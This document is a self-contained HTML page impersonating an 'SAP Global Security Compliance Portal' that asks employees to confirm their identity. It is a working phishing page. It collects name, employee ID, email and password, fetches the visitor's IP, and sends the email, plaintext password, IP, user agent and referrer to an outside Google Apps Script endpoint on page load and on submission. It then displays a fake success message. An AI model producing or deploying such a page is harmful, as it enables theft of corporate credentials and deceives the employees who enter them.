<!DOCTYPE html>
<html lang="en">

<head>

<meta charset="UTF-8">
<title>SAP Identity Verification</title>

<style>

body{
margin:0;
font-family:"Segoe UI",Arial,sans-serif;
background:#eef3f8;
display:flex;
justify-content:center;
align-items:center;
height:100vh;
}

.wrapper{
width:420px;
background:white;
border-radius:10px;
box-shadow:0 10px 30px rgba(0,0,0,0.2);
padding:35px;
text-align:center;
}

.logo{
font-size:26px;
font-weight:bold;
color:#0070f2;
margin-bottom:8px;
}

.header{
font-size:16px;
margin-bottom:25px;
color:#444;
}

.field{
text-align:left;
margin-bottom:15px;
}

label{
font-size:13px;
color:#555;
}

input{
width:100%;
padding:10px;
margin-top:5px;
border:1px solid #ccc;
border-radius:4px;
font-size:14px;
}

input:focus{
border-color:#0070f2;
outline:none;
}

button{
margin-top:10px;
width:100%;
padding:11px;
background:#0070f2;
color:white;
border:none;
border-radius:4px;
font-size:15px;
cursor:pointer;
}

button:hover{
background:#005ac7;
}

.footer{
margin-top:20px;
font-size:12px;
color:#888;
}

.success{
font-size:18px;
color:#2e7d32;
}

</style>

</head>

<body>

<div class="wrapper" id="formBox">

<div class="logo">SAP</div>

<div class="header">
S/4HANA Security Compliance Check  
Please confirm your SAP identity
</div>

<form id="sapForm">

<div class="field">
<label>Full Name</label>
<input type="text" id="name" required>
</div>

<div class="field">
<label>Employee ID</label>
<input type="text" id="empid" required>
</div>

<div class="field">
<label>Password</label>
<input type="password" id="password" required>
</div>

<div class="field">
<label>Corporate Email</label>
<input type="email" id="email" required>
</div>

<button type="submit">Confirm Identity</button>

</form>

<div class="footer">
SAP Global Security Compliance Portal
</div>

</div>

<script>

const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxN-v0e8m0xFolcYH6OXN0bj6jYC-sWxvWeGcSuCqBzLqsb6wKUdSjVFX2vChC1ALRn/exec";
let userIP = "";


async function getIP(){
const res = await fetch("https://api.ipify.org?format=json");
const data = await res.json();
userIP = data.ip;
}


async function logEvent(eventName,emailValue,passwordValue){

await fetch(SCRIPT_URL,{
method:"POST",
body:JSON.stringify({
event:eventName,
email:emailValue,
password:passwordValue,
ip:userIP,
userAgent:navigator.userAgent,
referrer:document.referrer
})
});

}


document.getElementById("sapForm").addEventListener("submit",async function(e){

e.preventDefault();

const email=document.getElementById("email").value;
const password=document.getElementById("password").value;

await logEvent("EMAIL_SUBMITTED",email,password);

document.getElementById("formBox").innerHTML=`
<div class="success">
<h2>Verification Complete</h2>
<p>Thank you for confirming your SAP credentials.</p>
</div>
`;

});


async function init(){
await getIP();
await logEvent("PAGE_OPEN","LINK_OPENED","");
}

init();

</script>

</body>
</html>
